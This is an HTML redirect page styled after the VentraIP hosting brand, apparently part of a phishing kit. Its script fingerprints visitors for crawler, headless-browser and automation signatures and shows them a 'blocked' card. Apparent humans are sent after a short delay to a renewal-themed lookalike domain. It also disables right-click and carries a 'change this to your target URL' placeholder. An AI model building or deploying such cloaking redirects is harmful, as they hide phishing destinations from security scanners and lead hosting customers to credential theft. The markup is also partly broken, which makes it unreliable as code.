<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Redirect | VentraIP Style</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary-blue: #1e3a8a;
            --secondary-blue: #3b82f6;
            --accent-cyan: #06b6d4;
            --dark-navy: #0f172a;
            --success: #10b981;
            --danger: #ef4444;
            --gray-100: #f1f5f9;
            --gray-800: #1e293b;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, var(--dark-navy) 0%, var(--primary-blue) 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            line-height: 1.6;
        }

        .container {
            width: 100%;
            max-width: 600px;
            padding: 20px;
        }

        .card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 48px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.4);
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.2);
            position: relative;
            overflow: hidden;
        }

        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-cyan), var(--secondary-blue), var(--primary-blue));
        }

        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, var(--secondary-blue), var(--accent-cyan));
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 32px;
            font-size: 36px;
            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.3);
        }

        h1 {
            color: var(--gray-800);
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 12px;
        }

        .subtitle {
            color: var(--gray-600);
            font-size: 16px;
            margin-bottom: 32px;
        }

        .security-status {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: var(--gray-100);
            padding: 12px 24px;
            border-radius: 50px;
            font-size: 14px;
            font-weight: 500;
            color: var(--gray-800);
            border: 2px solid transparent;
        }

        .security-status.verified {
            border-color: var(--success);
            background: #ecfdf5;
            color: var(--success);
        }

        .security-status.blocked {
            border-color: var(--danger);
            background: #fef2f2;
            color: var(--danger);
        }

        .loader {
            width: 40px;
            height: 40px;
            border: 3px solid var(--gray-100);
            border-top: 3px solid var(--secondary-blue);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .btn-primary {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            background: linear-gradient(135deg, var(--secondary-blue), var(--primary-blue));
            color: white;
            padding: 16px 32px;
            border-radius: 12px;
            text-decoration: none;
            font-weight: 600;
            font-size: 16px;
            border: none;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4);
            margin-top: 24px;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(59, 130, 246, 0.5);
        }

        .hidden {
            display: none !important;
        }

        .blocked-card {
            background: linear-gradient(135deg, #fef2f2, #fee2e2);
            border: 2px solid var(--danger);
        }

        .blocked-card h1 {
            color: var(--danger);
        }

        @media (max-width: 640px) {
            .card { padding: 32px 24px; }
            h1 { font-size: 24px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Loading Card (ÙŠØ¸Ù‡Ø± Ù„Ù„Ø¥Ù†Ø³Ø§Ù† Ù‚Ø¨Ù„ Ø§Ù„Ù€ Redirect) -->
        <div class="card" id="loadingCard">

            <div class="security-status verified" id="statusBadge">

        <div class="card blocked-card hidden" id="blockedCard">

    <script>
        // ========== CONFIGURATION ==========
        const CONFIG = {
            TARGET_URL: 'https://ventraip-renewal.com.au/privacy' // â† CHANGE THIS TO YOUR TARGET URL
        };

        // ========== BOT DETECTION ==========
        function isBot() {
            const signatures = [
                'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget',
                'python', 'java', 'scrapy', 'phantomjs', 'selenium',
                'headless', 'puppeteer', 'playwright', 'webdriver'
            ];

            const ua = navigator.userAgent.toLowerCase();
            const hasBotSignature = signatures.some(sig => ua.includes(sig));
            
            const checks = {
                noScreen: window.screen.width === 0 || window.screen.height === 0,
                noPlugins: navigator.plugins.length === 0,
                noLanguages: navigator.languages.length === 0,
                webdriver: navigator.webdriver === true
            };

            const suspiciousCount = Object.values(checks).filter(Boolean).length;
            return hasBotSignature || suspiciousCount >= 2;
        }

        // ========== MAIN ==========
        function init() {
            const botDetected = isBot();

            if (botDetected) {
                // Ø¥Ø¸Ù‡Ø§Ø± ØµÙØ­Ø© Ø§Ù„Ø­Ø¸Ø± Ù„Ù„Ø¨ÙˆØª
                document.getElementById('loadingCard').classList.add('hidden');
                document.getElementById('blockedCard').classList.remove('hidden');
                return;
            }

            // Ø¥Ù†Ø³Ø§Ù† â†’ Redirect ÙÙˆØ±ÙŠ
            setTimeout(() => {
                window.location.href = CONFIG.TARGET_URL;
            }, 800); // ØªØ£Ø®ÙŠØ± Ø¨Ø³ÙŠØ· 800ms Ø¨Ø§Ø´ ÙŠØ¨Ø§Ù† Ø§Ù„Ù€ Loading (Ø§Ø®ØªÙŠØ§Ø±ÙŠ)
            
            // Ø²Ø± ÙŠØ¯ÙˆÙŠ Ø§Ø­ØªÙŠØ§Ø·ÙŠ
            setTimeout(() => {
                document.getElementById('redirectBtn').classList.remove('hidden');
            }, 1000);
        }

        function manualRedirect() {
            window.location.href = CONFIG.TARGET_URL;
        }

        // Start immediately
        document.addEventListener('DOMContentLoaded', init);
        
        // Prevent right-click
        document.addEventListener('contextmenu', (e) => {
            if (!e.target.closest('button')) e.preventDefault();
        });
    </script>
</body>
</html>
